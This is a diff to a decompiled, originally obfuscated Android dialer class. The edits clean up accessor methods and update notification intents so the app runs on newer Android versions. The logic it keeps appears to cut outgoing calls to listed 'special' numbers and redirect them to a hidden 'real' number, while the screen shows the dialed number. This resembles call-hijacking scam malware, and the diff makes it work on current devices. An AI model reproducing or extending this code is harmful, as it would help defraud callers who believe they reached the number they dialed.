@@ -104,87 +104,15 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
     private TextView tvPhone2;
     private TextView tvRecording;
 
-    // $FF: synthetic method
-    static int access$000(PhoneActivity var0) {
-        return var0.notifyTime;
-    }
 
-    // $FF: synthetic method
-    static int access$100(PhoneActivity var0) {
-        return var0.startNotifyTimer();
-    }
-
-    // $FF: synthetic method
-    static TextView access$1000(PhoneActivity var0) {
-        return var0.tvCallingTime;
-    }
-
-    // $FF: synthetic method
-    static boolean access$1100(PhoneActivity var0) {
-        return var0.isCancelAutoEndCall;
-    }
-
-    // $FF: synthetic method
-    static int access$1200() {
-        return mCallType;
-    }
-
-    // $FF: synthetic method
-    static String access$1300() {
-        return mPhoneNumberReal;
-    }
-
-    // $FF: synthetic method
-    static String access$1400(PhoneActivity var0) {
-        return var0.pNumber;
-    }
-
-    // $FF: synthetic method
-    static Runnable access$200(PhoneActivity var0) {
-        return var0.notifyRunnable;
-    }
-
-    // $FF: synthetic method
-    static Handler access$300(PhoneActivity var0) {
-        return var0.handler;
-    }
-
-    // $FF: synthetic method
-    static String access$400() {
-        return TAG;
-    }
-
-    // $FF: synthetic method
-    static PhoneCallManager access$500(PhoneActivity var0) {
-        return var0.phoneCallManager;
-    }
-
-    // $FF: synthetic method
-    static RelativeLayout access$600() {
-        return rlCallingContainer;
-    }
-
-    // $FF: synthetic method
-    static RelativeLayout access$700() {
-        return rlIncomingContainer;
-    }
-
-    // $FF: synthetic method
-    static void access$800(PhoneActivity var0) {
-        var0.showTimer();
-    }
-
-    // $FF: synthetic method
-    static int access$900(PhoneActivity var0) {
-        return var0.callingTime;
-    }
-
-    // $FF: synthetic method
-    static int access$908(PhoneActivity var0) {
-        int var1 = var0.callingTime++;
-        return var1;
-    }
-
+    /**
+     * 拨打电话
+     * @param var0
+     * @param var1
+     * @param var2
+     * @param var3
+     * @param var4
+     */
     public static void actionStart(Context var0, String var1, String var2, int var3, String var4) {
         StringBuilder var5 = new StringBuilder();
         var5.append(PhoneCallService.class.getName());
@@ -201,6 +129,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         mSource = var4;
         mCallType = var3;
         mPhoneNumberReal = var2;
+        //跳转到该界面拨电话
         Intent var6 = new Intent(var0, PhoneActivity.class);
         var6.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 //         var4 = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHJCAkLDY9MDksOg");
@@ -474,7 +403,13 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
     private PendingIntent setPendingIntent(String var1) {
         Intent var2 = new Intent(this, TeleNotifyService.class);
         var2.setAction(var1);
-        return PendingIntent.getService(this, 0, var2, 0);
+        PendingIntent pendingIntent;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+            pendingIntent = PendingIntent.getActivity(this, 123, var2, PendingIntent.FLAG_IMMUTABLE);
+        } else {
+            pendingIntent = PendingIntent.getActivity(this, 123, var2, PendingIntent.FLAG_ONE_SHOT);
+        }
+        return pendingIntent;
     }
 
     private void showTimer() {
@@ -527,6 +462,10 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         this.startActivity(var1);
     }
 
+    /**
+     * 接通电话，开始计时
+     * @param var1
+     */
     public void callActive(Call var1) {
         StringBuilder var2 = new StringBuilder();
         var2.append(TAG);
@@ -539,6 +478,11 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         this.startNotification();
     }
 
+    /**
+     * 挂断电话
+     * @param var1
+     * @param var2
+     */
     public void callDisconnected(boolean var1, String var2) {
         StringBuilder var3 = new StringBuilder();
         String var4 = TAG;
@@ -576,6 +520,8 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
                     SettingUtils.startActivityForCall(this, var8);
                 }
             }
+            PhoneCallManager.resetInitState();
+            this.closeActivity();
         } else {
             RelativeLayout var7 = rlIncomingContainer;
             var7.setVisibility(View.GONE);
@@ -583,7 +529,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
             var7.setVisibility(View.GONE);
             PhoneCallManager.resetInitState();
             this.closeActivity();
-           // this.toHome();
+            this.toHome();
         }
 
 
@@ -651,7 +597,13 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
             Intent var7 = new Intent(this, PhoneActivity.class);
 //            var7.setFlags(0x14000000);
             var7.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-            PendingIntent var3 = PendingIntent.getActivity(this, 0, var7, 0);
+
+            PendingIntent var3;
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                var3 = PendingIntent.getActivity(this, 0, var7, PendingIntent.FLAG_IMMUTABLE);
+            } else {
+                var3 = PendingIntent.getActivity(this, 0, var7, PendingIntent.FLAG_ONE_SHOT);
+            }
             RemoteViews var8;
             if (mCallType == 1) {
                 var8 = new RemoteViews(this.getPackageName(), R.layout.cv);
@@ -834,6 +786,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
                     var1 = var8.getRealPhoneNumber();
 //                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), var1);
                     SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", var1);
+                    SharedPreferencesUtils.putValue(Constants.CALL_DURATION, callingTime);
                 }
             } else if (PhoneCallManager.call != null) {
 //                 String var9 = bb7d7pu7.m5998("RUmP5eCA_ceM-NWM5sI");
@@ -1104,23 +1057,22 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
 
         public void acceptCall() {
             StringBuilder var1 = new StringBuilder();
-            var1.append(PhoneActivity.access$400());
+            var1.append(this$0.TAG);
 //             var1.append(bb7d7pu7.m5998("RUkICgoMGR0qCAUF"));
             var1.append(", acceptCall");
             LogUtils.callLog(var1.toString());
-            PhoneActivity.access$500(this.this$0);
             PhoneCallManager.answer();
-            PhoneActivity.access$600().setVisibility(View.VISIBLE);
-            PhoneActivity.access$700().setVisibility(View.GONE);
+            rlCallingContainer.setVisibility(View.VISIBLE);
+            rlIncomingContainer.setVisibility(View.GONE);
         }
 
         public void rejectCall() {
             StringBuilder var1 = new StringBuilder();
-            var1.append(PhoneActivity.access$400());
+            var1.append(this$0.TAG);
 //             var1.append(bb7d7pu7.m5998("RUkbDAMMCh0qCAUF"));
             var1.append(", rejectCall");
             LogUtils.callLog(var1.toString());
-            PhoneActivity.access$500(this.this$0).reject();
+            this$0.phoneCallManager.reject();
             this.this$0.cancelTimer();
             this.this$0.closeActivity();
         }
@@ -1138,7 +1090,7 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         }
 
         public void run() {
-            PhoneActivity.access$800(this.this$0);
+            this.this$0.showTimer();
         }
     }
 
@@ -1157,31 +1109,32 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         }
 
         public void run() {
-            PhoneActivity.access$908(this.this$0);
-            PhoneActivity.access$1000(this.this$0).setText(this.this$0.getCallingTime());
+            this.this$0.callingTime++;
+            this.this$0.tvCallingTime.setText(this.this$0.getCallingTime());
             //if (bb7d7pu7.m5998("Bgc").equals(var1) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2)
-            if ("on".equals(this.val$switchStatus) && !PhoneActivity.access$1100(this.this$0) && (long) PhoneActivity.access$900(this.this$0) == 35L && PhoneActivity.access$1200() == 2) {
+            if ("on".equals(this.val$switchStatus) && !this.this$0.isCancelAutoEndCall && (long) this.this$0.callingTime == 35L && this$0.mCallType == 2) {
                 StringBuilder var4 = new StringBuilder();
-                LimitPhoneNumberBean var2 = SettingUtils.isSpecial(PhoneActivity.access$1300());
+                LimitPhoneNumberBean var2 = SettingUtils.isSpecial(this$0.mPhoneNumberReal);
                 if (var2 != null) {
-                    String var3 = PhoneActivity.access$400() +
+                    String var3 = this$0.TAG +
 //                     var3.append(bb7d7pu7.m5998("RUmP_t-A_t2M4dlFSYz41YzmwoHUxY7O0lNJ"));
                             ", 时间到, 呼叫转移: " +
                             var2.getRealPhoneNumber();
                     var4.append(var3);
-                    if (PhoneActivity.access$500(this.this$0).disconnect() || SettingUtils.endCall(this.this$0)) {
+                    if (this$0.phoneCallManager.disconnect() || SettingUtils.endCall(this.this$0)) {
 //                         String var6 = bb7d7pu7.m5998("RUmP5euP_8SO_dyBxvQ");
                         String var6 = ", 挂断电话";
                         var4.append(var6);
 //                         var6 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
                         var6 = "KEY_IS_FORWARDING_HAND_UP";
                         SharedPreferencesUtils.putValue(var6, true);
-                        var6 = PhoneActivity.access$1400(this.this$0);
+                        var6 = this.this$0.pNumber;
 //                         SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), var6);
                         SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", var6);
                         String var5 = var2.getRealPhoneNumber();
 //                         SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), var5);
                         SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", var5);
+                        SharedPreferencesUtils.putValue(Constants.CALL_DURATION, this$0.callingTime);
                     }
                 }
 
@@ -1201,14 +1154,14 @@ public class PhoneActivity extends AppCompatActivity implements View.OnClickList
         }
 
         public void run() {
-            int var1 = PhoneActivity.access$000(this.this$0);
+            int var1 = this$0.notifyTime;
             if (var1 >= 0) {
                 NotifyBean var2 = this.this$0.notifyBean;
                 if (var2 != null) {
                     var2.time = this.this$0.formatTime(var1);
                     this.this$0.createRemoteView();
-                    PhoneActivity.access$100(this.this$0);
-                    PhoneActivity.access$300(this.this$0).postDelayed(PhoneActivity.access$200(this.this$0), 1000L);
+                    this$0.startNotifyTimer();
+                    this.this$0.handler.postDelayed(this.this$0.notifyRunnable, 1000L);
                 }
             }
 
